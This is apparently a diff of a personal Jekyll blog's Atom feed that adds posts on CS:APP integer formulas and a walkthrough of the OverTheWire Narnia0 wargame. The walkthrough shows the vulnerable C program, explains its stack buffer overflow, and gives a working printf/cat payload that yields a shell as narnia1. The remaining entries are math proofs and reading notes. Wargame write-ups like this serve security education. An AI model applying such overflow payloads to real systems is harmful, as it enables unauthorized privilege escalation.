@@ -1,14 +1,124 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-11-24T16:22:45-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Journal</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Floor, ceiling techinques</title><link href="http://localhost:4000/2022/11/20/floor-ceiling.html" rel="alternate" type="text/html" title="Floor, ceiling techinques" /><published>2022-11-20T00:00:00-05:00</published><updated>2022-11-20T00:00:00-05:00</updated><id>http://localhost:4000/2022/11/20/floor%20ceiling</id><content type="html" xml:base="http://localhost:4000/2022/11/20/floor-ceiling.html"><![CDATA[<ol>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-14T11:24:01+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Journal</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Solution to Computer Systems: A Programmer’s Perspective</title><link href="http://localhost:4000/2024/04/13/solution-to-csapp.html" rel="alternate" type="text/html" title="Solution to Computer Systems: A Programmer’s Perspective" /><published>2024-04-13T00:00:00+09:00</published><updated>2024-04-13T00:00:00+09:00</updated><id>http://localhost:4000/2024/04/13/solution-to-csapp</id><content type="html" xml:base="http://localhost:4000/2024/04/13/solution-to-csapp.html"><![CDATA[<h1 id="practice-problem-11">Practice Problem 1.1</h1>]]></content><author><name></name></author><summary type="html"><![CDATA[Practice Problem 1.1]]></summary></entry><entry><title type="html">Formula for Computer Systems</title><link href="http://localhost:4000/2024/04/12/formula.html" rel="alternate" type="text/html" title="Formula for Computer Systems" /><published>2024-04-12T00:00:00+09:00</published><updated>2024-04-12T00:00:00+09:00</updated><id>http://localhost:4000/2024/04/12/formula</id><content type="html" xml:base="http://localhost:4000/2024/04/12/formula.html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+<p>For vector \(\vec{x} = [x_{w-1}, x_{w-2}, \ldots, x_0]\)
+\[B2U_{w}(\vec{x}) \stackrel{.}= \sum_{i=0}^{w-1} x_i2^i\]
+\[B2T_{w}(\vec{x}) \stackrel{.}= -x_{w-1}2^{w-1} + \sum_{i=0}^{w-2} x_i2^i\]
+\[B2O_{w}(\vec{x}) \stackrel{.}= -x_{w-1}(2^{w-1} - 1) + \sum_{i=0}^{w-2} x_i2^i\]
+\[B2S_{w}(\vec{x}) \stackrel{.}= (-1)^{x_{w-1}} \cdot \left(\sum_{i=0}^{w-2} x_i2^i \right)\]
+\[U2T_{w}(u) = \begin{cases}u, &amp; u\leq \text{TMax}_w\\ u-2^w, &amp; u&gt;\text{TMax}_w\end{cases}\]</p>
+
+<p>For \(x\) such that \(\text{TMin} \leq x \leq \text{TMax}\)
+\[B2U_{w}(T2B_{w}(x)) = T2U_{w}(x) = x+x_{w-1}2^{w}\]</p>
+
+<p>Truncation of an unsigned number
+\[B2U_k([x_{k-1}, x_{k-2}, \ldots, x_{0}]) = B2U_w([x_{w-1}, x_{w-2}, \ldots, x_0])\mod 2^k\]
+Truncation of a two’s-complement number
+\[B2U_k([x_{k-1}, x_{k-2}, \ldots, x_{0}]) = U2T_k(B2U_w([x_{w-1}, x_{w-2}, \ldots, x_0])\mod 2^k)\]</p>]]></content><author><name></name></author><summary type="html"><![CDATA[For vector \(\vec{x} = [x_{w-1}, x_{w-2}, \ldots, x_0]\) \[B2U_{w}(\vec{x}) \stackrel{.}= \sum_{i=0}^{w-1} x_i2^i\] \[B2T_{w}(\vec{x}) \stackrel{.}= -x_{w-1}2^{w-1} + \sum_{i=0}^{w-2} x_i2^i\] \[B2O_{w}(\vec{x}) \stackrel{.}= -x_{w-1}(2^{w-1} - 1) + \sum_{i=0}^{w-2} x_i2^i\] \[B2S_{w}(\vec{x}) \stackrel{.}= (-1)^{x_{w-1}} \cdot \left(\sum_{i=0}^{w-2} x_i2^i \right)\] \[U2T_{w}(u) = \begin{cases}u, &amp; u\leq \text{TMax}_w\\ u-2^w, &amp; u&gt;\text{TMax}_w\end{cases}\]]]></summary></entry><entry><title type="html">Solution for Narnia0: OverTheWire</title><link href="http://localhost:4000/2024/04/02/narnia1.html" rel="alternate" type="text/html" title="Solution for Narnia0: OverTheWire" /><published>2024-04-02T00:00:00+09:00</published><updated>2024-04-02T00:00:00+09:00</updated><id>http://localhost:4000/2024/04/02/narnia1</id><content type="html" xml:base="http://localhost:4000/2024/04/02/narnia1.html"><![CDATA[<h1 id="code">Code</h1>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Correct val's value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Here is your chance: "</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%24s"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"val: 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">){</span>
+        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"WAY OFF!!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+
+<h1 id="behaviour-of-this-code">Behaviour of this code</h1>
+
+<p>Initalize a variable of 4 bytes named <code class="language-plaintext highlighter-rouge">val</code> with value <code class="language-plaintext highlighter-rouge">0x41414141</code> and define a buffer of 20 bytes named <code class="language-plaintext highlighter-rouge">buf</code>.
+Write 24 bytes to <code class="language-plaintext highlighter-rouge">buf</code>. If <code class="language-plaintext highlighter-rouge">val</code> has the value <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>, then escalate priviliege to that of <code class="language-plaintext highlighter-rouge">narnia1</code> and spawn a shell.
+Otherwise exit the program with error.</p>
+
+<h1 id="vulnerability">Vulnerability</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>** Key Information **
+val:  4 bytes
+buf: 20 bytes
+scanf(): write 24 bytes into buf.
+</code></pre></div></div>
+
+<p>On line number <code class="language-plaintext highlighter-rouge">10</code>, the scanf function takes in 24 bytes into <code class="language-plaintext highlighter-rouge">buf</code>. However, <code class="language-plaintext highlighter-rouge">buf</code> is only 20 bytes. The remaining 4 bytes overflow and ovewrite the subsequent variable, <code class="language-plaintext highlighter-rouge">val</code>.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<ol>
+  <li>Fill <code class="language-plaintext highlighter-rouge">buf</code> with 20 bytes of characters.</li>
+  <li>Fill the rest with <code class="language-plaintext highlighter-rouge">0xefbeadde</code>(Little Endian).</li>
+</ol>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"%020x""</span><span class="se">\x</span><span class="s2">efbeadde"</span> | /narnia/narnia0 
+</code></pre></div></div>
+
+<p><strong>Result</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: 00000000000000000000ﾭ�
+val: 0xdeadbeef
+</code></pre></div></div>
+
+<p>We changed <code class="language-plaintext highlighter-rouge">val</code> to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> successfully. However, the shell did not spawn. This is because we need to read from the standard input. we use <code class="language-plaintext highlighter-rouge">cat</code> to do this.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span><span class="nb">printf</span> <span class="s2">"%020x</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de"</span><span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./narnia0
+Correct val<span class="s1">'s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: 00000000000000000000ﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+</span></code></pre></div></div>
+
+<p>Done.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Code]]></summary></entry><entry><title type="html">Floor, ceiling techinques</title><link href="http://localhost:4000/2022/11/20/floor-ceiling.html" rel="alternate" type="text/html" title="Floor, ceiling techinques" /><published>2022-11-20T00:00:00+09:00</published><updated>2022-11-20T00:00:00+09:00</updated><id>http://localhost:4000/2022/11/20/floor%20ceiling</id><content type="html" xml:base="http://localhost:4000/2022/11/20/floor-ceiling.html"><![CDATA[<ol>
   <li>Prove \( n = \lceil n/2 \rceil + \lfloor n/2 \rfloor \) where \(n\) is a nonnegative integer.</li>
 </ol>
 
 <p>We note that \(k = \lceil n/2 \rceil\) and \(m = \lfloor n/2 \rfloor\) are equivalent to \(k-1&lt; n/2 \leq k\) and \(m \leq n/2 &lt; m+1 \) respectively.
-Since if \(a\leq b\) and \(c &lt; d \), then \(a+c &lt; b+d\), the inequalities show that \(k+m-1 &lt; n &lt; k+m+1\). There is only one integer in this interval: \(m+k = \lceil n/2 \rceil + \lfloor n/2 \rfloor = n\) since there are \(\lceil k+m+1 \rceil - \lfloor k+m-1 \rfloor - 1 = k+m\) many integers in the interval.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Prove \( n = \lceil n/2 \rceil + \lfloor n/2 \rfloor \) where \(n\) is a nonnegative integer.]]></summary></entry><entry><title type="html">Chapter 2 exercises</title><link href="http://localhost:4000/analysis/exercise/chp2" rel="alternate" type="text/html" title="Chapter 2 exercises" /><published>2022-11-19T00:00:00-05:00</published><updated>2022-11-19T00:00:00-05:00</updated><id>http://localhost:4000/analysis/exercise/analysis_exercise1</id><content type="html" xml:base="http://localhost:4000/analysis/exercise/chp2"><![CDATA[<p>Exercise 2.3.1: 
-Prove Lemma 2.3.2</p>]]></content><author><name></name></author><category term="analysis" /><category term="exercise" /><summary type="html"><![CDATA[Exercise 2.3.1: Prove Lemma 2.3.2]]></summary></entry><entry><title type="html">Books to finish reading</title><link href="http://localhost:4000/2022/11/19/books-to-read.html" rel="alternate" type="text/html" title="Books to finish reading" /><published>2022-11-19T00:00:00-05:00</published><updated>2022-11-19T00:00:00-05:00</updated><id>http://localhost:4000/2022/11/19/books-to-read</id><content type="html" xml:base="http://localhost:4000/2022/11/19/books-to-read.html"><![CDATA[<p>Here are some books that any college student educated in computer science should have read and I should read.</p>
+Since if \(a\leq b\) and \(c &lt; d \), then \(a+c &lt; b+d\), the inequalities show that \(k+m-1 &lt; n &lt; k+m+1\). There is only one integer in this interval: \(m+k = \lceil n/2 \rceil + \lfloor n/2 \rfloor = n\) since there are \(\lceil k+m+1 \rceil - \lfloor k+m-1 \rfloor - 1 = k+m\) many integers in the interval.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Prove \( n = \lceil n/2 \rceil + \lfloor n/2 \rfloor \) where \(n\) is a nonnegative integer.]]></summary></entry><entry><title type="html">Chapter 2 exercises</title><link href="http://localhost:4000/analysis/exercise/chp2" rel="alternate" type="text/html" title="Chapter 2 exercises" /><published>2022-11-19T00:00:00+09:00</published><updated>2022-11-19T00:00:00+09:00</updated><id>http://localhost:4000/analysis/exercise/analysis_exercise1</id><content type="html" xml:base="http://localhost:4000/analysis/exercise/chp2"><![CDATA[<p>Exercise 2.3.1: 
+Prove Lemma 2.3.2</p>]]></content><author><name></name></author><category term="analysis" /><category term="exercise" /><summary type="html"><![CDATA[Exercise 2.3.1: Prove Lemma 2.3.2]]></summary></entry><entry><title type="html">Books to finish reading</title><link href="http://localhost:4000/2022/11/19/books-to-read.html" rel="alternate" type="text/html" title="Books to finish reading" /><published>2022-11-19T00:00:00+09:00</published><updated>2022-11-19T00:00:00+09:00</updated><id>http://localhost:4000/2022/11/19/books-to-read</id><content type="html" xml:base="http://localhost:4000/2022/11/19/books-to-read.html"><![CDATA[<p>Here are some books that any college student educated in computer science should have read and I should read.</p>
 <ol>
   <li>Concrete Mathematics by Donald E. Knuth (16.5% Completed)</li>
   <li>The C++ Programing Language by Bjarne Strostrup ()</li>
-</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Here are some books that any college student educated in computer science should have read and I should read. Concrete Mathematics by Donald E. Knuth (16.5% Completed) The C++ Programing Language by Bjarne Strostrup ()]]></summary></entry><entry><title type="html">Convention</title><link href="http://localhost:4000/convention/" rel="alternate" type="text/html" title="Convention" /><published>2022-11-18T00:00:00-05:00</published><updated>2022-11-18T00:00:00-05:00</updated><id>http://localhost:4000/convention</id><content type="html" xml:base="http://localhost:4000/convention/"><![CDATA[<h1 id="proofs-are-meant-to-be-concise">Proofs are meant to be concise</h1>
+</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Here are some books that any college student educated in computer science should have read and I should read. Concrete Mathematics by Donald E. Knuth (16.5% Completed) The C++ Programing Language by Bjarne Strostrup ()]]></summary></entry><entry><title type="html">Convention</title><link href="http://localhost:4000/convention/" rel="alternate" type="text/html" title="Convention" /><published>2022-11-18T00:00:00+09:00</published><updated>2022-11-18T00:00:00+09:00</updated><id>http://localhost:4000/convention</id><content type="html" xml:base="http://localhost:4000/convention/"><![CDATA[<h1 id="proofs-are-meant-to-be-concise">Proofs are meant to be concise</h1>
 <p>Mathematical proofs are written in a way to efficiently deliver the idea and are not necessarily intended to explain the concepts.</p>
 
 <h1 id="sufficient-explanations-for-ideas-are-given">Sufficient explanations for ideas are given</h1>
